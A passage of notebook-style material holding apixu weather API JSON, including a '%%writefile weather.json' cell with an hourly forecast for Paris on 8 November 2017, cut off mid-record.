00:00","temp_c":6.4,"temp_f":43.5,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":187,"wind_dir":"S","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":49,"cloud":5,"feelslike_c":6.0,"feelslike_f":42.8,"windchill_c":6.0,"windchill_f":42.8,"heatindex_c":6.4,"heatindex_f":43.5,"dewpoint_c":-3.4,"dewpoint_f":25.9,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510099200,"time":"2017-11-08 01:00","temp_c":6.1,"temp_f":43.0,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":177,"wind_dir":"S","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":50,"cloud":5,"feelslike_c":5.6,"feelslike_f":42.1,"windchill_c":5.6,"windchill_f":42.1,"heatindex_c":6.1,"heatindex_f":43.0,"dewpoint_c":-3.5,"dewpoint_f":25.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510102800,"time":"2017-11-08 02:00","temp_c":5.9,"temp_f":42.6,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.1,"wind_kph":5.0,"wind_degree":187,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":51,"cloud":6,"feelslike_c":5.2,"feelslike_f":41.4,"windchill_c":5.2,"windchill_f":41.4,"heatindex_c":5.9,"heatindex_f":42.6,"dewpoint_c":-3.5,"dewpoint_f":25.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.4,"vis_miles":12.0},{"time_epoch":1510106400,"time":"2017-11-08 03:00","temp_c":5.7,"temp_f":42.3,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":198,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":51,"cloud":8,"feelslike_c":4.7,"feelslike_f":40.5,"windchill_c":4.7,"windchill_f":40.5,"heatindex_c":5.7,"heatindex_f":42.3,"dewpoint_c":-3.6,"dewpoint_f":25.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.8,"vis_miles":11.0},{"time_epoch":1510110000,"time":"2017-11-08 04:00","temp_c":5.5,"temp_f":41.9,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.8,"wind_kph":6.1,"wind_degree":209,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":52,"cloud":9,"feelslike_c":4.3,"feelslike_f":39.7,"windchill_c":4.3,"windchill_f":39.7,"heatindex_c":5.5,"heatindex_f":41.9,"dewpoint_c":-3.6,"dewpoint_f":25.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510113600,"time":"2017-11-08 05:00","temp_c":5.4,"temp_f":41.7,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":198,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":54,"cloud":20,"feelslike_c":4.5,"feelslike_f":40.1,"windchill_c":4.5,"windchill_f":40.1,"heatindex_c":5.4,"heatindex_f":41.7,"dewpoint_c":-3.1,"dewpoint_f":26.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.4,"vis_miles":11.0},{"time_epoch":1510117200,"time":"2017-11-08 06:00","temp_c":5.3,"temp_f":41.5,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.9,"wind_kph":4.7,"wind_degree":187,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":57,"cloud":31,"feelslike_c":4.6,"feelslike_f":40.3,"windchill_c":4.6,"windchill_f":40.3,"heatindex_c":5.3,"heatindex_f":41.5,"dewpoint_c":-2.6,"dewpoint_f":27.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.6,"vis_miles":11.0},{"time_epoch":1510120800,"time":"2017-11-08 07:00","temp_c":5.2,"temp_f":41.4,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.5,"wind_kph":4.0,"wind_degree":176,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":59,"cloud":42,"feelslike_c":4.8,"feelslike_f":40.6,"windchill_c":4.8,"windchill_f":40.6,"heatindex_c":5.2,"heatindex_f":41.4,"dewpoint_c":-2.1,"dewpoint_f":28.2,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.7,"vis_miles":11.0},{"time_epoch":1510124400,"time":"2017-11-08 08:00","temp_c":5.6,"temp_f":42.1,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":2.5,"wind_kph":4.0,"wind_degree":168,"wind_dir":"SSE","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":60,"cloud":57,"feelslike_c":5.3,"feelslike_f":41.5,"windchill_c":5.3,"windchill_f":41.5,"heatindex_c":5.6,"heatindex_f":42.1,"dewpoint_c":-1.5,"dewpoint_f":29.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.5,"vis_miles":11.0},{"time_epoch":1510128000,"time":"2017-11-08 09:00","temp_c":5.9,"temp_f":42.6,"is_day":1,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/day/116.png","code":1003},"wind_mph":2.2,"wind_kph":3.6,"wind_degree":160,"wind_dir":"SSE","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":61,"cloud":73,"feelslike_c":5.7,"feelslike_f":42.3,"windchill_c":5.7,"windchill_f":42.3,"heatindex_c":5.9,"heatindex_f":42.6,"dewpoint_c":-0.9,"dewpoint_f":30.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.2,"vis_miles":11.0},{"time_epoch":1510131600,"time":"2017-11-08 10:00","temp_c":6.3,"temp_f":43.3,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":2.2,"wind_kph":3.6,"wind_degree":151,"wind_dir":"SSE","pressure_mb":1019.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":62,"cloud":88,"feelslike_c":6.2,"feelslike_f":43.2,"windchill_c":6.2,"windchill_f":43.2,"heatindex_c":6.3,"heatindex_f":43.3,"dewpoint_c":-0.3,"dewpoint_f":31.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.0,"vis_miles":11.0},{"time_epoch":1510135200,"time":"2017-11-08 11:00","temp_c":7.1,"temp_f":44.8,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":1.8,"wind_kph":2.9,"wind_degree":117,"wind_dir":"ESE","pressure_mb":1019.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":60,"cloud":84,"feelslike_c":7.1,"feelslike_f":44.8,"windchill_c":7.1,"windchill_f":44.8,"heatindex_c":7.1,"heatindex_f":44.8,"dewpoint_c":-0.1,"dewpoint_f":31.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.2,"vis_miles":11.0},{"time_epoch":1510138800,"time":"2017-11-08 12:00","temp_c":8.0,"temp_f":46.4,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":1.3,"wind_kph":2.2,"wind_degree":82,"wind_dir":"E","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":58,"cloud":80,"feelslike_c":7.9,"feelslike_f":46.2,"windchill_c":7.9,"windchill_f":46.2,"heatindex_c":8.0,"heatindex_f":46.4,"dewpoint_c":0.2,"dewpoint_f":32.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510142400,"time":"2017-11-08 13:00","temp_c":8.8,"temp_f":47.8,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":0.9,"wind_kph":1.4,"wind_degree":47,"wind_dir":"NE","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":76,"feelslike_c":8.8,"feelslike_f":47.8,"windchill_c":8.8,"windchill_f":47.8,"heatindex_c":8.8,"heatindex_f":47.8,"dewpoint_c":0.4,"dewpoint_f":32.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.5,"vis_miles":11.0},{"time_epoch":1510146000,"time":"2017-11-08 14:00","temp_c":9.1,"temp_f":48.4,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":1.8,"wind_kph":2.9,"wind_degree":143,"wind_dir":"SE","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":75,"feelslike_c":8.9,"feelslike_f":48.0,"windchill_c":8.9,"windchill_f":48.0,"heatindex_c":9.1,"heatindex_f":48.4,"dewpoint_c":0.6,"dewpoint_f":33.1,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.0,"vis_miles":11.0},{"time_epoch":1510149600,"time":"2017-11-08 15:00","temp_c":9.4,"temp_f":48.9,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":238,"wind_dir":"WSW","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":74,"feelslike_c":9.1,"feelslike_f":48.4,"windchill_c":9.1,"windchill_f":48.4,"heatindex_c":9.4,"heatindex_f":48.9,"dewpoint_c":0.8,"dewpoint_f":33.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.4,"vis_miles":12.0},{"time_epoch":1510153200,"time":"2017-11-08 16:00","temp_c":9.7,"temp_f":49.5,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":3.6,"wind_kph":5.8,"wind_degree":334,"wind_dir":"NNW","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":74,"feelslike_c":9.2,"feelslike_f":48.6,"windchill_c":9.2,"windchill_f":48.6,"heatindex_c":9.7,"heatindex_f":49.5,"dewpoint_c":1.0,"dewpoint_f":33.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510156800,"time":"2017-11-08 17:00","temp_c":9.3,"temp_f":48.7,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":333,"wind_dir":"NNW","pressure_mb":1021.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":59,"cloud":83,"feelslike_c":8.9,"feelslike_f":48.0,"windchill_c":8.9,"windchill_f":48.0,"heatindex_c":9.3,"heatindex_f":48.7,"dewpoint_c":1.5,"dewpoint_f":34.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.6,"vis_miles":12.0},{"time_epoch":1510160400,"time":"2017-11-08 18:00","temp_c":8.8,"temp_f":47.8,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.9,"wind_kph":4.7,"wind_degree":333,"wind_dir":"NNW","pressure_mb":1021.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":63,"cloud":91,"feelslike_c":8.5,"feelslike_f":47.3,"windchill_c":8.5,"windchill_f":47.3,"heatindex_c":8.8,"heatindex_f":47.8,"dewpoint_c":2.1,"dewpoint_f":35.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.3,"vis_miles":11.0},{"time_epoch":1510164000,"time":"2017-11-08 19:00","temp_c":8.4,"temp_f":47.1,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":332,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":67,"cloud":100,"feelslike_c":8.2,"feelslike_f":46.8,"windchill_c":8.2,"windchill_f":46.8,"heatindex_c":8.4,"heatindex_f":47.1,"dewpoint_c":2.6,"dewpoint_f":36.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.0,"vis_miles":11.0},{"time_epoch":1510167600,"time":"2017-11-08 20:00","temp_c":8.3,"temp_f":46.9,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":335,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":69,"cloud":92,"feelslike_c":8.1,"feelslike_f":46.6,"windchill_c":8.1,"windchill_f":46.6,"heatindex_c":8.3,"heatindex_f":46.9,"dewpoint_c":2.9,"dewpoint_f":37.2,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.6,"vis_miles":11.0},{"time_epoch":1510171200,"time":"2017-11-08 21:00","temp_c":8.2,"temp_f":46.8,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":337,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":71,"cloud":83,"feelslike_c":7.9,"feelslike_f":46.2,"windchill_c":7.9,"windchill_f":46.2,"heatindex_c":8.2,"heatindex_f":46.8,"dewpoint_c":3.2,"dewpoint_f":37.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510174800,"time":"2017-11-08 22:00","temp_c":8.1,"temp_f":46.6,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":340,"wind_dir":"NNW","pressure_mb":1023.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":73,"cloud":75,"feelslike_c":7.8,"feelslike_f":46.0,"windchill_c":7.8,"windchill_f":46.0,"heatindex_c":8.1,"heatindex_f":46.6,"dewpoint_c":3.5,"dewpoint_f":38.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":17.9,"vis_miles":11.0},{"time_epoch":1510178400,"time":"2017-11-08 23:00","temp_c":8.0,"temp_f":46.4,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":229,"wind_dir":"SW","pressure_mb":1023.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":72,"cloud":81,"feelslike_c":7.7,"feelslike_f":45.9,"windchill_c":7.7,"windchill_f":45.9,"heatindex_c":8.0,"heatindex_f":46.4,"dewpoint_c":3.3,"dewpoint_f":37.9,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":17.9,"vis_miles":11.0}]}]}} 


----
id:81

%%writefile weather.json
{"location":{"name":"Paris","region":"Ile-de-France","country":"France","lat":48.87,"lon":2.33,"tz_id":"Europe/Paris","localtime_epoch":1510121183,"localtime":"2017-11-08 7:06"},"current":{"last_updated_epoch":1510120819,"last_updated":"2017-11-08 07:00","temp_c":2.0,"temp_f":35.6,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":1.3,"wind_kph":2.2,"wind_degree":220,"wind_dir":"SW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":87,"cloud":75,"feelslike_c":2.0,"feelslike_f":35.6,"vis_km":10.0,"vis_miles":6.0},"forecast":{"forecastday":[{"date":"2017-11-08","date_epoch":1510099200,"day":{"maxtemp_c":9.7,"maxtemp_f":49.5,"mintemp_c":7.7,"mintemp_f":45.9,"avgtemp_c":7.3,"avgtemp_f":45.1,"maxwind_mph":3.8,"maxwind_kph":6.1,"totalprecip_mm":0.0,"totalprecip_in":0.0,"avgvis_km":18.8,"avgvis_miles":11.0,"avghumidity":59.0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"uv":0.9},"astro":{"sunrise":"07:49 AM","sunset":"05:20 PM","moonrise":"09:31 PM","moonset":"12:19 PM"},"hour":[{"time_epoch":1510095600,"time":"2017-11-08 00:00","temp_c":6.4,"temp_f":43.5,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":187,"wind_dir":"S","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":49,"cloud":5,"feelslike_c":6.0,"feelslike_f":42.8,"windchill_c":6.0,"windchill_f":42.8,"heatindex_c":6.4,"heatindex_f":43.5,"dewpoint_c":-3.4,"dewpoint_f":25.9,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510099200,"time":"2017-11-08 01:00","temp_c":6.1,"temp_f":43.0,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":177,"wind_dir":"S","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":50,"cloud":5,"feelslike_c":5.6,"feelslike_f":42.1,"windchill_c":5.6,"windchill_f":42.1,"heatindex_c":6.1,"heatindex_f":43.0,"dewpoint_c":-3.5,"dewpoint_f":25.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510102800,"time":"2017-11-08 02:00","temp_c":5.9,"temp_f":42.6,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.1,"wind_kph":5.0,"wind_degree":187,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":51,"cloud":6,"feelslike_c":5.2,"feelslike_f":41.4,"windchill_c":5.2,"windchill_f":41.4,"heatindex_c":5.9,"heatindex_f":42.6,"dewpoint_c":-3.5,"dewpoint_f":25.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.4,"vis_miles":12.0},{"time_epoch":1510106400,"time":"2017-11-08 03:00","temp_c":5.7,"temp_f":42.3,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":198,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":51,"cloud":8,"feelslike_c":4.7,"feelslike_f":40.5,"windchill_c":4.7,"windchill_f":40.5,"heatindex_c":5.7,"heatindex_f":42.3,"dewpoint_c":-3.6,"dewpoint_f":25.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.8,"vis_miles":11.0},{"time_epoch":1510110000,"time":"2017-11-08 04:00","temp_c":5.5,"temp_f":41.9,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.8,"wind_kph":6.1,"wind_degree":209,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":52,"cloud":9,"feelslike_c":4.3,"feelslike_f":39.7,"windchill_c":4.3,"windchill_f":39.7,"heatindex_c":5.5,"heatindex_f":41.9,"dewpoint_c":-3.6,"dewpoint_f":25.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510113600,"time":"2017-11-08 05:00","temp_c":5.4,"temp_f":41.7,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":198,"wind_dir":"SSW","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":54,"cloud":20,"feelslike_c":4.5,"feelslike_f":40.1,"windchill_c":4.5,"windchill_f":40.1,"heatindex_c":5.4,"heatindex_f":41.7,"dewpoint_c":-3.1,"dewpoint_f":26.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.4,"vis_miles":11.0},{"time_epoch":1510117200,"time":"2017-11-08 06:00","temp_c":5.3,"temp_f":41.5,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.9,"wind_kph":4.7,"wind_degree":187,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":57,"cloud":31,"feelslike_c":4.6,"feelslike_f":40.3,"windchill_c":4.6,"windchill_f":40.3,"heatindex_c":5.3,"heatindex_f":41.5,"dewpoint_c":-2.6,"dewpoint_f":27.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.6,"vis_miles":11.0},{"time_epoch":1510120800,"time":"2017-11-08 07:00","temp_c":5.2,"temp_f":41.4,"is_day":0,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/night/116.png","code":1003},"wind_mph":2.5,"wind_kph":4.0,"wind_degree":176,"wind_dir":"S","pressure_mb":1017.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":59,"cloud":42,"feelslike_c":4.8,"feelslike_f":40.6,"windchill_c":4.8,"windchill_f":40.6,"heatindex_c":5.2,"heatindex_f":41.4,"dewpoint_c":-2.1,"dewpoint_f":28.2,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.7,"vis_miles":11.0},{"time_epoch":1510124400,"time":"2017-11-08 08:00","temp_c":5.6,"temp_f":42.1,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":2.5,"wind_kph":4.0,"wind_degree":168,"wind_dir":"SSE","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":60,"cloud":57,"feelslike_c":5.3,"feelslike_f":41.5,"windchill_c":5.3,"windchill_f":41.5,"heatindex_c":5.6,"heatindex_f":42.1,"dewpoint_c":-1.5,"dewpoint_f":29.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.5,"vis_miles":11.0},{"time_epoch":1510128000,"time":"2017-11-08 09:00","temp_c":5.9,"temp_f":42.6,"is_day":1,"condition":{"text":"Partly cloudy","icon":"//cdn.apixu.com/weather/64x64/day/116.png","code":1003},"wind_mph":2.2,"wind_kph":3.6,"wind_degree":160,"wind_dir":"SSE","pressure_mb":1018.0,"pressure_in":30.5,"precip_mm":0.0,"precip_in":0.0,"humidity":61,"cloud":73,"feelslike_c":5.7,"feelslike_f":42.3,"windchill_c":5.7,"windchill_f":42.3,"heatindex_c":5.9,"heatindex_f":42.6,"dewpoint_c":-0.9,"dewpoint_f":30.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.2,"vis_miles":11.0},{"time_epoch":1510131600,"time":"2017-11-08 10:00","temp_c":6.3,"temp_f":43.3,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":2.2,"wind_kph":3.6,"wind_degree":151,"wind_dir":"SSE","pressure_mb":1019.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":62,"cloud":88,"feelslike_c":6.2,"feelslike_f":43.2,"windchill_c":6.2,"windchill_f":43.2,"heatindex_c":6.3,"heatindex_f":43.3,"dewpoint_c":-0.3,"dewpoint_f":31.5,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.0,"vis_miles":11.0},{"time_epoch":1510135200,"time":"2017-11-08 11:00","temp_c":7.1,"temp_f":44.8,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":1.8,"wind_kph":2.9,"wind_degree":117,"wind_dir":"ESE","pressure_mb":1019.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":60,"cloud":84,"feelslike_c":7.1,"feelslike_f":44.8,"windchill_c":7.1,"windchill_f":44.8,"heatindex_c":7.1,"heatindex_f":44.8,"dewpoint_c":-0.1,"dewpoint_f":31.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.2,"vis_miles":11.0},{"time_epoch":1510138800,"time":"2017-11-08 12:00","temp_c":8.0,"temp_f":46.4,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":1.3,"wind_kph":2.2,"wind_degree":82,"wind_dir":"E","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":58,"cloud":80,"feelslike_c":7.9,"feelslike_f":46.2,"windchill_c":7.9,"windchill_f":46.2,"heatindex_c":8.0,"heatindex_f":46.4,"dewpoint_c":0.2,"dewpoint_f":32.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510142400,"time":"2017-11-08 13:00","temp_c":8.8,"temp_f":47.8,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":0.9,"wind_kph":1.4,"wind_degree":47,"wind_dir":"NE","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":76,"feelslike_c":8.8,"feelslike_f":47.8,"windchill_c":8.8,"windchill_f":47.8,"heatindex_c":8.8,"heatindex_f":47.8,"dewpoint_c":0.4,"dewpoint_f":32.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.5,"vis_miles":11.0},{"time_epoch":1510146000,"time":"2017-11-08 14:00","temp_c":9.1,"temp_f":48.4,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":1.8,"wind_kph":2.9,"wind_degree":143,"wind_dir":"SE","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":75,"feelslike_c":8.9,"feelslike_f":48.0,"windchill_c":8.9,"windchill_f":48.0,"heatindex_c":9.1,"heatindex_f":48.4,"dewpoint_c":0.6,"dewpoint_f":33.1,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.0,"vis_miles":11.0},{"time_epoch":1510149600,"time":"2017-11-08 